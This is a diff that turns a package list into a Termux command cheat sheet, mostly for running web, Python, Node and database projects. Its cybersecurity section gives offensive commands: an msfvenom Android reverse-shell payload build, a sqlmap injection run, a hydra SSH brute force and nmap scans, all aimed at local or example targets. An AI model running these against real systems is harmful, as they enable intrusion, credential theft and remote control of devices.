@@ -1,100 +1,266 @@
-aria2
-wget2
-p7zip
-unrar
-xz
-bzip2
-gzip
-zstd
-lzip
-lz4
-patch
-diffutils
-findutils
-grep
-sed
-gawk
-less
-more
-which
-file
-stat
-procps
-psmisc
-util-linux
-lsof
-strace
-htop
-btop
-iotop
-screen
-zsh
-fish
-bash
+=======================================================================
+1. WEB SERVERS & HOSTING PROJECTS
+=======================================================================
+# Python Local Web Server (Serves current folder on port 8000)
+python -m http.server 8000
+python3 -m SimpleHTTPServer 8080
 
-python-numpy
-python-scipy
-python-pandas
-python-matplotlib
-python-pillow
-python-requests
-python-flask
-python-django
-python-pycryptodome
-python-opencv
+# PHP Local Web Server (Serves current folder on port 8080)
+php -S localhost:8080
+php -S 0.0.0.0:8080 -t public/
 
-typescript
-deno
-yarn
-pnpm
+# NodeJS Simple Web Server (requires 'npm install http-server')
+npx http-server -p 8080
+npx serve -s . -p 3000
 
-gradle
-maven
-ant
+# Expose Local Project to the Internet (Online Tunneling)
+ngrok http 8080
+ssh -R 80:localhost:8080 nokey@localhost.run
+cloudflared tunnel --url http://localhost:8080
 
-sqlite-utils
-mongodb
-couchdb
+# Install and Run Nginx Web Server
+pkg install nginx
+nginx                  # Start server
+nginx -s reload        # Reload config
+nginx -s stop          # Stop server
 
-lighttpd
-caddy
-certbot
+=======================================================================
+2. PYTHON PROJECTS (Web, API, Bots, Scraping)
+=======================================================================
+# --- Django Web Project ---
+pip install django
+django-admin startproject myproject
+cd myproject
+python manage.py migrate
+python manage.py runserver 0.0.0.0:8000
+python manage.py createsuperuser
 
-wireguard-tools
-openvpn
-tor
-proxychains-ng
+# --- Flask API Project ---
+pip install flask
+pip install flask-cors
+# (Write your app.py, then run:)
+python app.py
+flask run --host=0.0.0.0 --port=5000
 
-hydra
-john
-sqlmap
-nikto
-hashcat
+# --- FastAPI Modern API Project ---
+pip install fastapi uvicorn
+uvicorn main:app --host 0.0.0.0 --port 8000 --reload
 
-espeak
-festival
-pocketsphinx
+# --- Web Scraping Projects ---
+pip install requests beautifulsoup4
+pip install scrapy
+scrapy startproject scraper_project
+cd scraper_project
+scrapy crawl my_spider
 
-youtube-dl
-yt-dlp
+# --- Telegram Bot Projects ---
+pip install python-telegram-bot
+pip install pyTelegramBotAPI
+pip install telethon
+python bot.py
 
-imagemagick
-graphicsmagick
+# --- Discord Bot Projects ---
+pip install discord.py
+python discord_bot.py
 
-pandoc
-texlive
+# --- Automate Browsers (Selenium / Playwright) ---
+pip install selenium
+pip install playwright
+playwright install chromium
+python scrape_script.py
 
-rclone
-megapass
-git-lfs
+=======================================================================
+3. NODE.JS / JAVASCRIPT PROJECTS (React, APIs, Bots)
+=======================================================================
+# --- Install NodeJS ---
+pkg install nodejs
 
-docker
-podman
+# --- Basic Node Project Setup ---
+npm init -y
+npm install express
+node index.js
 
-qemu-system-x86-64
-qemu-utils
+# --- Running a Cloned Node Project ---
+git clone https://github.com/user/project.git
+cd project
+npm install        # Install all dependencies
+npm start          # Run the project
+npm run dev        # Run in development mode
 
-fortune
-cowsay
-figlet
-lolcat
+# --- React Projects ---
+npx create-react-app my-app
+cd my-app
+npm start
+
+# --- Next.js Projects ---
+npx create-next-app@latest
+cd my-app
+npm run dev
+
+# --- Express API Server ---
+npm install express cors body-parser
+node server.js
+
+# --- Telegram/Discord Bots in Node ---
+npm install telegraf
+npm install discord.js
+node bot.js
+
+# --- Process Manager (Keep Node projects running in background) ---
+npm install -g pm2
+pm2 start index.js --name "my-api"
+pm2 list
+pm2 logs
+pm2 stop my-api
+pm2 restart my-api
+
+# --- Web Scraping in Node ---
+npm install axios cheerio
+npm install puppeteer
+node scraper.js
+
+=======================================================================
+4. DATABASES (Backend for Projects)
+=======================================================================
+# --- SQLite (Built-in Python) ---
+sqlite3 database.db
+.tables
+SELECT * FROM users;
+
+# --- PostgreSQL ---
+pkg install postgresql
+initdb $PREFIX/var/lib/postgresql
+pg_ctl -D $PREFIX/var/lib/postgresql start
+psql -U $USER -d postgres
+
+# --- MariaDB (MySQL) ---
+pkg install mariadb
+mysql_install_db
+mysqld_safe &
+mysql -u root -p
+
+# --- Redis (In-memory cache) ---
+pkg install redis
+redis-server
+redis-cli
+
+# --- MongoDB (NoSQL) ---
+pkg install mongodb
+mongod --dbpath=$PREFIX/var/lib/mongodb
+mongo
+
+=======================================================================
+5. CLONING & RUNNING GITHUB PROJECTS
+=======================================================================
+# General workflow for any open source project:
+pkg install git
+git clone https://github.com/username/project.git
+cd project
+
+# If it's a Python project:
+python -m venv venv       # Create virtual environment
+source venv/bin/activate  # Activate it
+pip install -r requirements.txt  # Install dependencies
+python main.py            # Run the project
+
+# If it's a NodeJS project:
+npm install               # Install dependencies
+npm start                 # Run the project
+
+# If it's a C/C++ project:
+pkg install clang make
+./configure
+make
+./executable_name
+
+# Update an existing cloned project
+git pull origin main
+
+=======================================================================
+6. PHP & WEB DEVELOPMENT PROJECTS
+=======================================================================
+# Install PHP and Composer
+pkg install php
+pkg install composer
+
+# Create a Laravel Project
+composer create-project laravel/laravel my-app
+cd my-app
+php artisan serve --host 0.0.0.0 --port 8000
+
+# Run WordPress locally
+php -S localhost:8080 -t wordpress/
+
+=======================================================================
+7. RUBY ON RAILS PROJECTS
+=======================================================================
+pkg install ruby
+gem install rails
+rails new my_app
+cd my_app
+rails server -b 0.0.0.0 -p 3000
+
+=======================================================================
+8. GO LANG PROJECTS
+=======================================================================
+pkg install golang
+go mod init myproject
+go get github.com/gin-gonic/gin
+go run main.go
+go build main.go
+
+=======================================================================
+9. DOCKER-LIKE CONTAINERS (Proot in Termux)
+=======================================================================
+# Termux uses proot-distro to run full Linux distros for projects
+pkg install proot-distro
+proot-distro install ubuntu
+proot-distro login ubuntu
+
+# Inside Ubuntu (proot), you can run standard apt projects:
+apt update && apt install apache2 mysql-server php
+service apache2 start
+
+=======================================================================
+10. NETWORK & CYBERSECURITY PROJECTS
+=======================================================================
+# --- Metasploit Framework ---
+pkg install metasploit-framework
+msfconsole
+msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > app.apk
+
+# --- Network Scanning Project ---
+pkg install nmap
+nmap -sC -sV -p- 192.168.1.1
+nmap -sn 192.168.1.0/24
+
+# --- SQL Injection Automation ---
+pkg install sqlmap
+sqlmap -u "http://example.com/page?id=1" --dbs
+
+# --- Password Cracking/Brute Force ---
+pkg install hydra
+hydra -l admin -P rockyou.txt ssh://127.0.0.1
+
+# --- Packet Sniffing ---
+pkg install tcpdump
+tcpdump -i any
+
+=======================================================================
+11. BACKGROUND EXECUTION (Keep projects running after closing Termux)
+=======================================================================
+# Method 1: NoHup (Standard Linux)
+nohup python app.py > output.log 2>&1 &
+
+# Method 2: Termux specific wake-lock (prevents Android from killing it)
+termux-wake-lock
+python app.py &
+termux-wake-unlock
+
+# Method 3: TMUX (Terminal Multiplexer)
+pkg install tmux
+tmux new -s myproject
+# (Run your project inside)
+# Press Ctrl+B, then D to detach
+# To come back to it later:
+tmux attach -t myproject
